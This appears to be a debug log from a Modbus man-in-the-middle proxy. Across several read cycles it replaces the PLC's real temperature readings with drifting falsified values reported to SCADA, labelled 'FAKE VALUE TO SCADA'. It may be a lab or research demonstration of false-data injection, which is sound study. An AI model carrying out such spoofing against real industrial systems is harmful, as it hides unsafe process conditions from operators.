2025-12-25 16:01:51,851 DEBUG logging:103 RECV: 0x0 0x1b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x30 0x2 0x7f 0x0 0x0
2025-12-25 16:01:51,851 DEBUG logging:103 Processing: 0x0 0x1b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x30 0x2 0x7f 0x0 0x0
2025-12-25 16:01:51,851 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:01:51,851 DEBUG logging:103 Adding transaction 27
2025-12-25 16:01:51,851 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:51,851 DEBUG logging:103 Getting transaction 27
2025-12-25 16:01:51,851 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:01:51,851 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:51,851 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:01:51,851 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 639
[*] DELTA : -61.26
[*] Last value Reported to SCADA : 576.26
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 571.46
[*]==> FAKE VALUE TO SCADA: 571
2025-12-25 16:01:51,851 DEBUG logging:103 send: 0x0 0x1b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x30 0x2 0x3b 0x0 0x0
2025-12-25 16:02:08,281 DEBUG logging:103 recv: 0x0 0x1c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0x1f 0x0 0x0 old_data:  addr=None
2025-12-25 16:02:08,282 DEBUG logging:103 Handling data: 0x0 0x1c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0x1f 0x0 0x0
2025-12-25 16:02:08,282 DEBUG logging:103 Processing: 0x0 0x1c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0x1f 0x0 0x0
2025-12-25 16:02:08,282 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:02:08,282 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:02:08,282 DEBUG logging:103 Running transaction 28
2025-12-25 16:02:08,282 DEBUG logging:103 SEND: 0x0 0x1c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x2 0x1f 0x0 0x0
2025-12-25 16:02:08,282 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:02:08,282 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:02:08,284 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:02:08,284 DEBUG logging:103 RECV: 0x0 0x1c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:02:08,284 DEBUG logging:103 Processing: 0x0 0x1c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:02:08,284 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:02:08,284 DEBUG logging:103 Adding transaction 28
2025-12-25 16:02:08,284 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:08,284 DEBUG logging:103 Getting transaction 28
2025-12-25 16:02:08,284 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:02:08,284 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:08,284 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:02:08,284 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:02:08,284 DEBUG logging:103 send: 0x0 0x1c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:02:22,861 DEBUG logging:103 recv: 0x0 0x1d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:02:22,861 DEBUG logging:103 Handling data: 0x0 0x1d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:02:22,861 DEBUG logging:103 Processing: 0x0 0x1d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:02:22,861 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:02:22,861 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:02:22,861 DEBUG logging:103 Running transaction 29
2025-12-25 16:02:22,861 DEBUG logging:103 SEND: 0x0 0x1d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:02:22,861 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:02:22,861 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:02:22,863 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:02:22,863 DEBUG logging:103 RECV: 0x0 0x1d 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x2 0x1f 0x0 0x0
2025-12-25 16:02:22,863 DEBUG logging:103 Processing: 0x0 0x1d 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x2 0x1f 0x0 0x0
2025-12-25 16:02:22,863 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:02:22,863 DEBUG logging:103 Adding transaction 29
2025-12-25 16:02:22,863 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:22,863 DEBUG logging:103 Getting transaction 29
2025-12-25 16:02:22,863 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:02:22,864 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:22,864 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:02:22,864 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 543
[*] DELTA : -56.46
[*] Last value Reported to SCADA : 571.46
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 566.01
[*]==> FAKE VALUE TO SCADA: 566
2025-12-25 16:02:22,864 DEBUG logging:103 send: 0x0 0x1d 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x2 0x36 0x0 0x0
2025-12-25 16:02:38,294 DEBUG logging:103 recv: 0x0 0x1e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x1 0xe6 0x0 0x0 old_data:  addr=None
2025-12-25 16:02:38,295 DEBUG logging:103 Handling data: 0x0 0x1e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x1 0xe6 0x0 0x0
2025-12-25 16:02:38,295 DEBUG logging:103 Processing: 0x0 0x1e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x1 0xe6 0x0 0x0
2025-12-25 16:02:38,295 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:02:38,295 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:02:38,295 DEBUG logging:103 Running transaction 30
2025-12-25 16:02:38,295 DEBUG logging:103 SEND: 0x0 0x1e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x1 0xe6 0x0 0x0
2025-12-25 16:02:38,295 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:02:38,295 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:02:38,297 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:02:38,297 DEBUG logging:103 RECV: 0x0 0x1e 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:02:38,297 DEBUG logging:103 Processing: 0x0 0x1e 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:02:38,297 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:02:38,297 DEBUG logging:103 Adding transaction 30
2025-12-25 16:02:38,297 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:38,297 DEBUG logging:103 Getting transaction 30
2025-12-25 16:02:38,297 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:02:38,297 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:38,297 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:02:38,297 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:02:38,297 DEBUG logging:103 send: 0x0 0x1e 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:02:53,868 DEBUG logging:103 recv: 0x0 0x1f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:02:53,868 DEBUG logging:103 Handling data: 0x0 0x1f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:02:53,868 DEBUG logging:103 Processing: 0x0 0x1f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:02:53,868 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:02:53,868 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:02:53,868 DEBUG logging:103 Running transaction 31
2025-12-25 16:02:53,868 DEBUG logging:103 SEND: 0x0 0x1f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:02:53,869 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:02:53,869 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:02:53,870 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:02:53,870 DEBUG logging:103 RECV: 0x0 0x1f 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3f 0x1 0xe6 0x0 0x0
2025-12-25 16:02:53,870 DEBUG logging:103 Processing: 0x0 0x1f 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3f 0x1 0xe6 0x0 0x0
2025-12-25 16:02:53,870 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:02:53,870 DEBUG logging:103 Adding transaction 31
2025-12-25 16:02:53,872 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:53,872 DEBUG logging:103 Getting transaction 31
2025-12-25 16:02:53,872 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:02:53,872 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:02:53,873 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:02:53,873 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 486
[*] DELTA : -51.01
[*] Last value Reported to SCADA : 566.01
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 561.41
[*]==> FAKE VALUE TO SCADA: 561
2025-12-25 16:02:53,873 DEBUG logging:103 send: 0x0 0x1f 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3f 0x2 0x31 0x0 0x0
2025-12-25 16:03:08,298 DEBUG logging:103 recv: 0x0 0x20 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2f 0x1 0xd0 0x0 0x0 old_data:  addr=None
2025-12-25 16:03:08,299 DEBUG logging:103 Handling data: 0x0 0x20 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2f 0x1 0xd0 0x0 0x0
2025-12-25 16:03:08,299 DEBUG logging:103 Processing: 0x0 0x20 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2f 0x1 0xd0 0x0 0x0
2025-12-25 16:03:08,299 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:03:08,299 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:03:08,299 DEBUG logging:103 Running transaction 32
2025-12-25 16:03:08,299 DEBUG logging:103 SEND: 0x0 0x20 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2f 0x1 0xd0 0x0 0x0
2025-12-25 16:03:08,299 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:03:08,299 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:03:08,301 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:03:08,301 DEBUG logging:103 RECV: 0x0 0x20 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:03:08,301 DEBUG logging:103 Processing: 0x0 0x20 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:03:08,301 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:03:08,301 DEBUG logging:103 Adding transaction 32
2025-12-25 16:03:08,301 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:08,301 DEBUG logging:103 Getting transaction 32
2025-12-25 16:03:08,301 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:03:08,301 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:08,301 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:03:08,301 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:03:08,301 DEBUG logging:103 send: 0x0 0x20 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:03:24,879 DEBUG logging:103 recv: 0x0 0x21 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:03:24,880 DEBUG logging:103 Handling data: 0x0 0x21 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:03:24,880 DEBUG logging:103 Processing: 0x0 0x21 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:03:24,880 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:03:24,880 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:03:24,880 DEBUG logging:103 Running transaction 33
2025-12-25 16:03:24,880 DEBUG logging:103 SEND: 0x0 0x21 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:03:24,880 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:03:24,881 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:03:24,882 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:03:24,882 DEBUG logging:103 RECV: 0x0 0x21 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x2f 0x1 0xd0 0x0 0x0
2025-12-25 16:03:24,882 DEBUG logging:103 Processing: 0x0 0x21 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x2f 0x1 0xd0 0x0 0x0
2025-12-25 16:03:24,882 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:03:24,883 DEBUG logging:103 Adding transaction 33
2025-12-25 16:03:24,883 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:24,883 DEBUG logging:103 Getting transaction 33
2025-12-25 16:03:24,883 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:03:24,883 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:24,883 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:03:24,883 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 464
[*] DELTA : -46.41
[*] Last value Reported to SCADA : 561.41
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 556.13
[*]==> FAKE VALUE TO SCADA: 556
2025-12-25 16:03:24,883 DEBUG logging:103 send: 0x0 0x21 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x2f 0x2 0x2c 0x0 0x0
2025-12-25 16:03:38,311 DEBUG logging:103 recv: 0x0 0x22 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x41 0x2 0xe0 0x0 0x0 old_data:  addr=None
2025-12-25 16:03:38,311 DEBUG logging:103 Handling data: 0x0 0x22 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x41 0x2 0xe0 0x0 0x0
2025-12-25 16:03:38,311 DEBUG logging:103 Processing: 0x0 0x22 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x41 0x2 0xe0 0x0 0x0
2025-12-25 16:03:38,312 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:03:38,312 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:03:38,312 DEBUG logging:103 Running transaction 34
2025-12-25 16:03:38,312 DEBUG logging:103 SEND: 0x0 0x22 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x41 0x2 0xe0 0x0 0x0
2025-12-25 16:03:38,312 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:03:38,312 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:03:38,313 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:03:38,313 DEBUG logging:103 RECV: 0x0 0x22 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:03:38,313 DEBUG logging:103 Processing: 0x0 0x22 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:03:38,313 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:03:38,313 DEBUG logging:103 Adding transaction 34
2025-12-25 16:03:38,313 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:38,313 DEBUG logging:103 Getting transaction 34
2025-12-25 16:03:38,313 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:03:38,314 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:38,314 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:03:38,314 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:03:38,314 DEBUG logging:103 send: 0x0 0x22 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:03:55,881 DEBUG logging:103 recv: 0x0 0x23 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:03:55,882 DEBUG logging:103 Handling data: 0x0 0x23 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:03:55,882 DEBUG logging:103 Processing: 0x0 0x23 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:03:55,882 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:03:55,882 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:03:55,882 DEBUG logging:103 Running transaction 35
2025-12-25 16:03:55,882 DEBUG logging:103 SEND: 0x0 0x23 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:03:55,882 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:03:55,882 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:03:55,884 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:03:55,884 DEBUG logging:103 RECV: 0x0 0x23 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x41 0x2 0xe0 0x0 0x0
2025-12-25 16:03:55,884 DEBUG logging:103 Processing: 0x0 0x23 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x41 0x2 0xe0 0x0 0x0
2025-12-25 16:03:55,884 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:03:55,884 DEBUG logging:103 Adding transaction 35
2025-12-25 16:03:55,884 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:55,884 DEBUG logging:103 Getting transaction 35
2025-12-25 16:03:55,885 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:03:55,885 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:03:55,885 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:03:55,885 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 736
[*] DELTA : -41.13
[*] Last value Reported to SCADA : 556.13
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 551.52
[*]==> FAKE VALUE TO SCADA: 551
2025-12-25 16:03:55,886 DEBUG logging:103 send: 0x0 0x23 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x41 0x2 0x27 0x0 0x0
2025-12-25 16:04:08,312 DEBUG logging:103 recv: 0x0 0x24 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x29 0x1 0xbd 0x0 0x0 old_data:  addr=None
2025-12-25 16:04:08,313 DEBUG logging:103 Handling data: 0x0 0x24 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x29 0x1 0xbd 0x0 0x0
2025-12-25 16:04:08,313 DEBUG logging:103 Processing: 0x0 0x24 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x29 0x1 0xbd 0x0 0x0
2025-12-25 16:04:08,313 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:04:08,313 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:04:08,313 DEBUG logging:103 Running transaction 36
2025-12-25 16:04:08,313 DEBUG logging:103 SEND: 0x0 0x24 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x29 0x1 0xbd 0x0 0x0
2025-12-25 16:04:08,313 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:04:08,313 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:04:08,315 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:04:08,315 DEBUG logging:103 RECV: 0x0 0x24 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:04:08,315 DEBUG logging:103 Processing: 0x0 0x24 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:04:08,315 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:04:08,315 DEBUG logging:103 Adding transaction 36
2025-12-25 16:04:08,315 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:08,316 DEBUG logging:103 Getting transaction 36
2025-12-25 16:04:08,316 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:04:08,316 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:08,316 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:04:08,316 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:04:08,316 DEBUG logging:103 send: 0x0 0x24 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:04:26,882 DEBUG logging:103 recv: 0x0 0x25 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:04:26,883 DEBUG logging:103 Handling data: 0x0 0x25 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:04:26,883 DEBUG logging:103 Processing: 0x0 0x25 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:04:26,883 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:04:26,883 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:04:26,883 DEBUG logging:103 Running transaction 37
2025-12-25 16:04:26,883 DEBUG logging:103 SEND: 0x0 0x25 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:04:26,883 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:04:26,883 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:04:26,885 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:04:26,885 DEBUG logging:103 RECV: 0x0 0x25 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x29 0x1 0xbd 0x0 0x0
2025-12-25 16:04:26,885 DEBUG logging:103 Processing: 0x0 0x25 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x29 0x1 0xbd 0x0 0x0
2025-12-25 16:04:26,885 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:04:26,886 DEBUG logging:103 Adding transaction 37
2025-12-25 16:04:26,886 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:26,886 DEBUG logging:103 Getting transaction 37
2025-12-25 16:04:26,886 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:04:26,886 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:26,886 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:04:26,886 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 445
[*] DELTA : -36.52
[*] Last value Reported to SCADA : 551.52
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 546.63
[*]==> FAKE VALUE TO SCADA: 546
2025-12-25 16:04:26,887 DEBUG logging:103 send: 0x0 0x25 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x29 0x2 0x22 0x0 0x0
2025-12-25 16:04:38,320 DEBUG logging:103 recv: 0x0 0x26 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x3 0xb 0x0 0x0 old_data:  addr=None
2025-12-25 16:04:38,320 DEBUG logging:103 Handling data: 0x0 0x26 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x3 0xb 0x0 0x0
2025-12-25 16:04:38,320 DEBUG logging:103 Processing: 0x0 0x26 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x3 0xb 0x0 0x0
2025-12-25 16:04:38,320 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:04:38,320 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:04:38,320 DEBUG logging:103 Running transaction 38
